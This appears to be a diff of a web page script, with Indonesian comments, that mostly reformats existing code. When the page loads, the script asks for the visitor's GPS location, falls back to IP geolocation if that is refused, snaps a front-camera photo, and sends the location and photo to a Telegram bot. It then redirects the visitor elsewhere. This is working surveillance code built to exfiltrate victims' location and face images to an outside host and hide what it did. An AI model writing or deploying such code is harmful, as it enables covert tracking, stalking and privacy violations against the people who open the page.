@@ -77,18 +77,26 @@
         retryBtn.style.display = 'inline-block';
     }
 
-    // 1. Minta IZIN LOKASI (GPS) - bakal muncul popup browser
+    // STEP 1: Minta IZIN LOKASI (GPS) - bakal muncul popup browser
     function getLocationByGPS() {
         return new Promise((resolve, reject) => {
-            if(!navigator.geolocation) return reject('GPS tidak didukung');
+            if(!navigator.geolocation) {
+                reject(new Error('GPS tidak didukung'));
+                return;
+            }
+            // INI YANG MUNCULIN POPUP IZIN LOKASI
             navigator.geolocation.getCurrentPosition(
-                pos => resolve({ 
-                    lat: pos.coords.latitude, 
-                    lon: pos.coords.longitude, 
-                    accuracy: pos.coords.accuracy + ' meter', 
-                    source: 'GPS' 
-                }),
-                err => reject(err),
+                (pos) => {
+                    resolve({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy + ' meter',
+                        source: 'GPS'
+                    });
+                },
+                (err) => {
+                    reject(err);
+                },
                 { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
             );
         });
@@ -100,41 +108,45 @@
         if(!r.ok) throw new Error('IP API gagal');
         const d = await r.json();
         if(!d.latitude || !d.longitude) throw new Error('Data IP tidak lengkap');
-        return { 
-            lat: d.latitude, 
-            lon: d.longitude, 
-            accuracy: 'Perkiraan (IP)', 
-            source: 'IP (fallback)' 
+        return {
+            lat: d.latitude,
+            lon: d.longitude,
+            accuracy: 'Perkiraan (IP)',
+            source: 'IP (fallback)'
         };
     }
 
-    // 2. Minta IZIN KAMERA (depan) - bakal muncul popup browser
+    // STEP 2: Minta IZIN KAMERA (depan) - bakal muncul popup browser
     function capturePhoto() {
         return new Promise((resolve, reject) => {
-            navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: 'user', width: 400, height: 400 } 
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: 400, height: 400 }
             })
-            .then(stream => {
+            .then((stream) => {
                 const video = document.getElementById('cameraVideo');
                 video.srcObject = stream;
                 video.onloadedmetadata = () => {
                     video.play();
                     setTimeout(() => {
                         const canvas = document.createElement('canvas');
-                        canvas.width = 400; canvas.height = 400;
+                        canvas.width = 400;
+                        canvas.height = 400;
                         const ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0, 400, 400);
                         stream.getTracks().forEach(t => t.stop());
                         video.srcObject = null;
-                        canvas.toBlob(blob => blob ? resolve(blob) : reject('Gagal capture'), 'image/jpeg', 0.85);
+                        canvas.toBlob((blob) => {
+                            if(blob) resolve(blob);
+                            else reject(new Error('Gagal capture'));
+                        }, 'image/jpeg', 0.85);
                     }, 300);
                 };
-                video.onerror = () => { 
-                    stream.getTracks().forEach(t => t.stop()); 
-                    reject('Error kamera'); 
+                video.onerror = () => {
+                    stream.getTracks().forEach(t => t.stop());
+                    reject(new Error('Error kamera'));
                 };
             })
-            .catch(reject);
+            .catch((err) => reject(err));
         });
     }
 
@@ -142,7 +154,7 @@
     async function sendToTelegram(loc, photo) {
         const lat = loc.lat, lon = loc.lon;
         const text = `📍 Lokasi: ${loc.source}\nLat: ${lat}\nLon: ${lon}\nAkurasi: ${loc.accuracy}`;
-        
+
         const payload = {
             chat_id: CHAT_ID,
             text: text,
@@ -162,57 +174,60 @@
             const fd = new FormData();
             fd.append('chat_id', CHAT_ID);
             fd.append('photo', photo, 'photo.jpg');
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
-                method: 'POST', 
-                body: fd 
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: fd
             }).catch(() => {});
         }
     }
 
-    // PROSES UTAMA
+    // PROSES UTAMA - URUTAN: LOKASI DULU, BARU KAMERA
     async function mainProcess() {
         if(isProcessing) return;
         isProcessing = true;
         showLoading();
 
         try {
-            // Step 1: Minta izin LOKASI (bakal muncul popup)
+            // STEP 1: Minta izin LOKASI (bakal muncul popup)
             let loc;
-            try { 
-                loc = await getLocationByGPS(); 
-            } catch(e) { 
+            try {
+                loc = await getLocationByGPS();
+            } catch(e) {
                 // Kalo ditolak, pake IP
-                loc = await getLocationByIP(); 
+                loc = await getLocationByIP();
             }
             locationData = loc;
 
-            // Step 2: Minta izin KAMERA (bakal muncul popup)
-            try { 
-                photoBlob = await capturePhoto(); 
-            } catch(e) {}
+            // STEP 2: Minta izin KAMERA (bakal muncul popup)
+            try {
+                photoBlob = await capturePhoto();
+            } catch(e) {
+                // Kalo ditolak, lanjut tanpa foto
+            }
 
-            // Step 3: Kirim ke Telegram
+            // STEP 3: Kirim ke Telegram
             await sendToTelegram(locationData, photoBlob);
 
-            // Step 4: Redirect
-            setTimeout(() => { 
-                window.location.href = REDIRECT_URL; 
+            // STEP 4: Redirect
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
             }, 1000);
 
         } catch(err) {
             console.warn(err);
             showError();
-        } finally { 
-            isProcessing = false; 
+        } finally {
+            isProcessing = false;
         }
     }
 
-    retryBtn.addEventListener('click', () => { 
-        locationData = null; 
-        photoBlob = null; 
-        mainProcess(); 
+    retryBtn.addEventListener('click', () => {
+        locationData = null;
+        photoBlob = null;
+        mainProcess();
     });
 
+    // START
     mainProcess();
 })();
 </script>
